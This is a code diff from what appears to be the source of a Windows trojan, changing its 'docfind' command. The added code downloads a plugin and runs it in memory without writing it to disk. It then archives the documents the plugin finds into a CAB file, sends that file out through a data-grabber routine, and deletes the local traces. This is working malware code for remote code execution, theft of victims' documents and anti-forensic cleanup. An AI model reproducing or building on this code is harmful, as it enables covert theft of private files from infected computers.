@@ -747,25 +747,42 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	typedef BOOL (WINAPI *TFindMethod)(HANDLE DllHandle, DWORD Reason, LPVOID);
+	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID);
 	BYTE* data = 0;
 	DWORD size = 0;
 	data = Plugin::Download( "docfind.plug", 0, &size, false );
 	bool res = false;
 	if( data )
 	{
-		File::WriteBufferA( "c:\\docfind.plug", data, size );
+		//File::WriteBufferA( "c:\\docfind.plug", data, size );
 		HMEMORYMODULE module = MemoryLoadLibrary(data);
 		if( module )
 		{
-			TFindMethod Func = *(TFindMethod*)MemoryGetProcAddress(module, "gAltEPOffs" );
-			if(Func)
+			DWORD* gAltEPOffs = (DWORD*)MemoryGetProcAddress(module, "gAltEPOffs" );
+			if( gAltEPOffs )
 			{
-				HANDLE Event = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
-				Func(NULL, DLL_PROCESS_ATTACH, NULL);
-				pWaitForSingleObject(Event, INFINITE);
-                pSleep(7000);
-				pCloseHandle(Event);
+				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
+				if( func )
+				{
+					TASKDBG( "Task", "Выполняется команда docfind" );
+					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
+					func( 0, DLL_PROCESS_ATTACH, 0 );
+					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
+					pCloseHandle(hEvent);
+					func( 0, DLL_PROCESS_DETACH, 0 );
+					char path[MAX_PATH], tmpName[MAX_PATH];
+					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
+					pPathAppendA( path, "search" );
+					TASKDBG( "Task", "Поиск файлов завершен, отправляем папку %s", path );
+					File::GetTempName(tmpName);
+					HCAB cab = CreateCab(tmpName);
+					AddDirToCab( cab, path, "docfind" );
+					CloseCab(cab);
+					TASKDBG( "Task", "сформирован cab файл %s", tmpName );
+					DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
+					pDeleteFileA(tmpName);
+					Directory::Delete(path);
+				}
 			}
 			MemoryFreeLibrary(module);
 		}
